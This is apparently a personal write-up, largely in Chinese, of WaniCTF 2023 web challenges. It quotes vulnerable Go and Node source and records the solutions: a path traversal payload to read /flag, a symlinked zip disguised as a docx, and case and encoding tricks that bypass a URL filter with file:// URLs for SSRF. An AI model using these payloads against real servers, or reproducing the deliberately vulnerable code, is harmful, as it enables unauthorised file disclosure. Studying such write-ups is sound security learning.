
# web
### IndexedDB
![[Pasted image 20230504225116.png]]
容易注意到 跳转到 `1ndex.html`  禁用js并访问 `index.html`

`FLAG{y0u_c4n_u3e_db_1n_br0wser}`

### Extract Service 1

```go
package main

import (
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func main() {
	r := gin.Default()
	r.LoadHTMLGlob("templates/*")

	r.MaxMultipartMemory = 1 << 20 // 1MiB, to prevent DoS

	r.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", gin.H{
			"result": "",
		})
	})

	r.POST("/", func(c *gin.Context) {
		baseDir := filepath.Join("/tmp", uuid.NewString()) // ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e
		zipPath := baseDir + ".zip"                        // ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip

		file, err := c.FormFile("file")
		if err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		extractTarget := c.PostForm("target")
		if extractTarget == "" {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : target is required",
			})
			return
		}

		if err := os.MkdirAll(baseDir, 0777); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		if err := c.SaveUploadedFile(file, zipPath); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		if err := ExtractFile(zipPath, baseDir); err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		result, err := ExtractContent(baseDir, extractTarget)
		if err != nil {
			c.HTML(http.StatusOK, "index.html", gin.H{
				"result": "Error : " + err.Error(),
			})
			return
		}

		c.HTML(http.StatusOK, "index.html", gin.H{
			"result": result,
		})
	})

	if err := r.Run(":8080"); err != nil {
		panic(err)
	}
}

func ExtractFile(zipPath, baseDir string) error {
	if err := exec.Command("unzip", zipPath, "-d", baseDir).Run(); err != nil {
		return err
	}
	return nil
}

func ExtractContent(baseDir, extractTarget string) (string, error) {
	raw, err := os.ReadFile(filepath.Join(baseDir, extractTarget))
	if err != nil {
		return "", err
	}

	removeXmlTag := regexp.MustCompile("<.*?>")
	resultXmlTagRemoved := removeXmlTag.ReplaceAllString(string(raw), "")
	removeNewLine := regexp.MustCompile(`\r?\n`)
	resultNewLineRemoved := removeNewLine.ReplaceAllString(resultXmlTagRemoved, "")
	return resultNewLineRemoved, nil
}

```


go, `ExtractContent`  下 `filepath.Join(baseDir, extractTarget)` 直接拼接了目录与extractTarget,而extractTarget又是可控的,直接抓包修改为 `../../../../../../../flag`

`FLAG{ex7r4c7_1s_br0k3n_by_b4d_p4r4m3t3rs}`

### 64bps
#header
```shell
dd if=/dev/random of=2gb.txt bs=1M count=2048
cat flag.txt >> 2gb.txt
rm flag.txt
```

可以看到随机生成了2GB的文件,直接访问肯定是不行,在拷打了一番GPT后,终于给出了满意的答案
设置http请求头  `Range:bytes=-1024`
```python
import requests

url = "https://64bps-web.wanictf.org/2gb.txt"
headers = {"Range": "bytes=-1024"}

response = requests.get(url, headers=headers)
if response.status_code == 206:
    # 处理接收到的文件尾部数据
    data = response.content
    print(data)
else:
    print("Failed to read file tail:", response.status_code)
```


`FLAG{m@ke_use_0f_r@n0e_reques7s_f0r_l@r9e_f1les}`

### Extract Service 2
```diff
--- C:\Users\20925\Downloads\web-extract1\main.go
+++ C:\Users\20925\Downloads\web-extract2\main.go
@@ -35,10 +35,24 @@
 			return
 		}
 
-		extractTarget := c.PostForm("target")
-		if extractTarget == "" {
+		// patched
+		extractTarget := ""
+		targetParam := c.PostForm("target")
+		if targetParam == "" {
 			c.HTML(http.StatusOK, "index.html", gin.H{
 				"result": "Error : target is required",
+			})
+			return
+		}
+		if targetParam == "docx" {
+			extractTarget = "word/document.xml"
+		} else if targetParam == "xlsx" {
+			extractTarget = "xl/sharedStrings.xml"
+		} else if targetParam == "pptx" {
+			extractTarget = "ppt/slides/slide1.xml"
+		} else {
+			c.HTML(http.StatusOK, "index.html", gin.H{
+				"result": "Error : target is invalid",
 			})
 			return
 		}

```

比较一下,extractTarget不直接接收post,而是根据target给extractTarget赋值,头疼...

---

zip #zip
```shell
mkdir word;
ln -s /flag word/document.xml;
zip -ry attack.docx word;
```



### Screenshot
#ssrf
```js
const playwright = require("playwright");
const express = require("express");
const morgan = require("morgan");

const main = async function () {
  const browser = await playwright.chromium.launch();

  const app = express();

  // Logging
  app.use(morgan("short"));

  app.use(express.static("static"));

  app.get("/api/screenshot", async function (req, res) {
    const context = await browser.newContext();
    context.setDefaultTimeout(5000);

    try {
      if (!req.query.url.includes("http") || req.query.url.includes("file")) {
        res.status(400).send("Bad Request");
        return;
      }

      const page = await context.newPage();

      const params = new URLSearchParams(req.url.slice(req.url.indexOf("?")));
      await page.goto(params.get("url"));

      const buf = await page.screenshot();

      res.header("Content-Type", "image/png").send(buf);
    } catch (err) {
      console.log("[Error]", req.method, req.url, err);
      res.status(500).send("Internal Error");
    } finally {
      await context.close();
    }
  });

  app.listen(80, () => {
    console.log("Listening on port 80");
  });
};

main();

```

使用`playwright` 库生成网页截图,初步思路是利用302跳转实现ssrf读取 `/flag`
但是浏览器应该是存在安全限制,显示 internal error  

---
大写绕过file限制,#绕过http限制,该死啊这居然没想到
`FILE:///flag.txt%23http`
`File:///http/../../flag.txt`

`f%09ile:///flag.txt?http` [[js#解析url时会自动去除特殊字符]]


### lambda
---
题目给了一个csv文件,里面有aws的access id 和secret key,可以使用python的bob3库交互
```python
import boto3

# Create a Boto3 client using the Access Key ID and Secret Access Key
client = boto3.client(
    's3',
    aws_access_key_id='YOUR_ACCESS_KEY_ID',
    aws_secret_access_key='YOUR_SECRET_ACCESS_KEY',
    region_name='ap-northeast-1'
)

# Use the client to interact with AWS services
response = client.list_buckets()
print(response)
```

但是好像复现的时候已经access denied了
# reverse

# pwn

# crypto

# Misc


---
## *相关wp*
https://mikecat.github.io/ctf-writeups/2023/20230504_WaniCTF_2023/
https://thoracic-cupcake-95a.notion.site/wanictf-2023-writeups-eng-a8b6f6275fe9435e8be28c7c550cc6ac



2023-05-04   22:15